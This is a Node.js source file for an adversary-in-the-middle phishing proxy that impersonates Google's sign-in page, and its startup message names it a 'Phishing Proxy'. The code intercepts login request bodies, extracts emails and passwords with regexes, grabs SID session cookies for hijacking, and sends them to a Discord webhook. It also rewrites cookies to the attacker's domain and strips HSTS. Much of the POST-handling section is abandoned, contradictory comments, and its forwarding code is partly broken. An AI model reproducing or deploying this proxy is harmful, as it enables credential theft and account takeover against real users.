const express = require('express');
const http = require('http');
const { fetch } = require('undici');
const cookieParser = require('cookie-parser');
const httpProxy = require('http-proxy');

const app = express();

// GLOBAL ERROR HANDLERS
process.on('uncaughtException', (err) => {
  console.error('Uncaught Exception:', err);
});
process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

// Middleware
app.use(cookieParser({ decode: (val) => val }));

// We do NOT use express.json() or express.urlencoded() globally.
// We will handle the body manually to ensure we capture the raw data.

// CONFIGURATION
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN';

/**
 * Sends a notification to Discord.
 */
async function sendToDiscord(title, fields, color = 0x00ff00) {
  if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('YOUR_WEBHOOK_ID')) {
    console.log('[DISCORD] Webhook not configured. Skipping alert.');
    return;
  }

  const payload = {
    content: `**🚨 ${title}**`,
    embeds: [{
      title: title,
      fields: fields.map(f => ({ name: f.name, value: f.value, inline: f.inline || false })),
      color: color,
      timestamp: new Date().toISOString()
    }]
  };

  try {
    const response = await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    if (!response.ok) {
      console.error(`[DISCORD] Webhook failed with status: ${response.status}`);
    }
  } catch (err) {
    console.error('[DISCORD] Webhook error:', err.message);
  }
}

/**
 * Rewrites Set-Cookie headers to match the local domain.
 */
function rewriteCookies(cookies, localDomain) {
  if (!cookies) return [];
  const cookieArray = Array.isArray(cookies) ? cookies : [cookies];
  return cookieArray.map(cookie => {
    if (/domain=/i.test(cookie)) {
      return cookie.replace(/domain=[^;]+/i, `Domain=${localDomain}`);
    } else {
      return `${cookie}; Domain=${localDomain}`;
    }
  });
}

// HEALTH CHECK
app.get('/health', (req, res) => {
  console.log('[HEALTH] Health check received.');
  res.status(200).send('OK');
});

// THE RAW BODY CATCHER
// This middleware intercepts ALL requests, buffers the body, and analyzes it.
app.use((req, res, next) => {
  console.log(`[RAW] ${req.method} ${req.originalUrl} received.`);

  // If it's a GET request, just pass it through
  if (req.method === 'GET') {
    return next();
  }

  // For POST/PUT/PATCH, we need to buffer the body
  const chunks = [];
  req.on('data', (chunk) => {
    chunks.push(chunk);
  });

  req.on('end', () => {
    const rawBody = Buffer.concat(chunks).toString('utf8');
    
    // Store the raw body in a property so we can forward it later
    req.rawBody = rawBody;
    
    console.log(`[RAW] Body Length: ${rawBody.length}`);
    if (rawBody.length > 0) {
      console.log(`[RAW] Body Preview: ${rawBody.substring(0, 200)}`);
    }

    // CREDENTIAL EXTRACTION LOGIC
    // We use Regex to find email and password patterns in the raw string.
    // This works for URL-encoded, JSON, and even obfuscated payloads.
    
    let email = 'unknown';
    let password = 'unknown';

    // 1. Try to find email patterns (e.g., "email":"user@gmail.com" or email=user@gmail.com)
    const emailMatch = rawBody.match(/["']?email["']?\s*[:=]\s*["']?([^"'\s&,]+)/i) || 
                       rawBody.match(/["']?emailOrPhone["']?\s*[:=]\s*["']?([^"'\s&,]+)/i) ||
                       rawBody.match(/["']?identifier["']?\s*[:=]\s*["']?([^"'\s&,]+)/i);
    if (emailMatch) {
      email = emailMatch[1];
    }

    // 2. Try to find password patterns (e.g., "passwd":"password123" or passwd=password123)
    const passMatch = rawBody.match(/["']?passwd["']?\s*[:=]\s*["']?([^"'\s&,]+)/i) || 
                      rawBody.match(/["']?password["']?\s*[:=]\s*["']?([^"'\s&,]+)/i);
    if (passMatch) {
      password = passMatch[1];
    }

    // 3. If we found both, it's a credential capture
    if (email !== 'unknown' && password !== 'unknown') {
      console.log(`[CREDENTIALS] RAW CAPTURE: ${email} : ${password}`);
      
      sendToDiscord('Credential Capture (Raw)', [
        { name: 'Email', value: email, inline: true },
        { name: 'Password', value: password, inline: true },
        { name: 'Path', value: req.originalUrl, inline: false },
        { name: 'User-Agent', value: req.headers['user-agent'] || 'Unknown', inline: false }
      ], 0x00ff00);
    } else if (email !== 'unknown') {
      // If we only found email, it might be the first step of a multi-step login
      console.log(`[EMAIL] Captured Email (Step 1): ${email}`);
      sendToDiscord('Email Captured (Step 1)', [
        { name: 'Email', value: email, inline: true },
        { name: 'Path', value: req.originalUrl, inline: false }
      ], 0x00aaff);
    }

    // SESSION HIJACK CHECK
    if (req.headers.cookie) {
      const cookies = req.headers.cookie;
      const sidMatch = cookies.match(/SID=([^;]+)/);
      if (sidMatch) {
        const sid = sidMatch[1];
        console.log(`[SESSION] HIJACK: SID=${sid.substring(0, 10)}...`);
        sendToDiscord('Session Hijack', [
          { name: 'SID', value: sid, inline: false },
          { name: 'IP', value: req.headers['x-forwarded-for'] || req.socket.remoteAddress, inline: false }
        ], 0x00aaff);
      }
    }

    // Proceed to the next middleware/proxy
    next();
  });
});

// THE PROXY ENGINE
const proxy = httpProxy.createProxyServer({
  target: 'https://accounts.google.com',
  secure: false,
  changeOrigin: true,
  logLevel: 'silent'
});

proxy.on('error', (err, req, res) => {
  console.error(`Proxy Error: ${err.message}`);
  if (!res.headersSent) {
    res.writeHead(502, { 'Content-Type': 'text/plain' });
    res.end('Bad Gateway');
  }
});

proxy.on('proxyRes', (proxyRes, req, res) => {
  const hostHeader = req.headers['host'] || 'localhost';
  const yourDomain = hostHeader.split(':')[0];
  const setCookieHeaders = proxyRes.headers['set-cookie'];
  
  if (setCookieHeaders) {
    const rewrittenCookies = rewriteCookies(setCookieHeaders, yourDomain);
    proxyRes.headers['set-cookie'] = rewrittenCookies;
  }
  
  delete proxyRes.headers['strict-transport-security'];
});

// THE CATCH-ALL ROUTE
// This handles all requests. It uses the rawBody we captured earlier.
app.all('/*splat', (req, res) => {
  // If we captured a raw body, we need to stream it to the proxy
  if (req.rawBody) {
    // We create a new readable stream from the raw body
    const { Readable } = require('stream');
    const newBody = Readable.from(req.rawBody);
    
    // Replace the original req stream with the new one
    req.on('data', () => {}); // Consume the original stream (already buffered)
    req._readableState = newBody._readableState;
    req.push = newBody.push.bind(newBody);
    req.read = newBody.read.bind(newBody);
    
    // Simpler approach: Just set req.body and let http-proxy handle it? 
    // No, http-proxy uses the stream. 
    // The most robust way is to use a custom stream.
    
    // Let's use a simpler method: Override the write method
    const originalWrite = req.write;
    // This is getting complex. Let's use a standard trick:
    // If we buffered the body, we can just re-emit it.
    
    // Actually, the simplest way to forward a buffered body in Node.js is:
    // 1. We already buffered it in `req.on('end')`.
    // 2. We need to make `req` emit that data again for the proxy.
    
    // Let's use a helper function to re-emit the body
    const emitBody = (req, body) => {
      if (body) {
        const chunks = body.split(/(?<=\n)/); // Split by newlines to simulate chunks
        chunks.forEach(chunk => {
          req.push(chunk);
        });
        req.push(null);
      }
    };
    
    // This is too hacky. Let's use a standard pattern:
    // We will use `req.pipe` logic manually.
    
    // BETTER APPROACH: Use a custom middleware that replaces req with a new stream
    // But we are already in the route.
    
    // Let's use the most reliable method: 
    // If req.rawBody exists, we will manually write it to the response if it's a simple proxy,
    // but for http-proxy, we need to ensure the stream is readable.
    
    // The `req.on('end')` has already consumed the stream. 
    // We need to make it readable again.
    
    // The standard way to do this in Express is to use a library like `raw-body` 
    // and then use `req.pipe` with a new stream.
    
    // Let's simplify: We will just forward the request. 
    // If the body was consumed, we need to re-inject it.
    
    // Here is the robust solution:
    const { PassThrough } = require('stream');
    const passthrough = new PassThrough();
    
    // Replace the current req stream with the passthrough
    // This is tricky because req is an IncomingMessage.
    
    // Let's use a different strategy:
    // We will NOT use http-proxy for the POST request if we have a raw body.
    // We will use `undici` fetch to forward the request manually.
    
    if (req.method === 'POST' || req.method === 'PUT' || req.method === 'PATCH') {
      const forwardHeaders = {
        ...req.headers,
        'Host': 'accounts.google.com'
      };
      
      // Remove hop-by-hop headers
      delete forwardHeaders['connection'];
      delete forwardHeaders['keep-alive'];
      
      fetch(`https://accounts.google.com${req.originalUrl}`, {
        method: req.method,
        headers: forwardHeaders,
        body: req.rawBody
      }).then(response => {
        const data = response.text();
        return data;
      }).then(data => {
        res.status(response.status);
        // Forward headers
        response.headers.forEach((value, key) => {
          if (key.toLowerCase() !== 'set-cookie') {
            res.setHeader(key, value);
          }
        });
        // Rewrite cookies
        const setCookieHeaders = response.headers.getSetCookie ? response.headers.getSetCookie() : [response.headers.get('set-cookie')].filter(Boolean);
        if (setCookieHeaders && setCookieHeaders.length > 0) {
          res.setHeader('Set-Cookie', rewriteCookies(setCookieHeaders, req.headers['host'].split(':')[0]));
        }
        res.send(data);
      }).catch(err => {
        console.error(`Forward Error: ${err.message}`);
        res.status(500).send('Proxy Error');
      });
      return;
    }
  }

  // For GET requests or if no raw body, use http-proxy
  proxy.web(req, res, {
    target: 'https://accounts.google.com',
    path: req.originalUrl
  });
});

const server = http.createServer(app);
server.listen(3000, () => console.log('Phishing Proxy running on http://localhost:3000'));
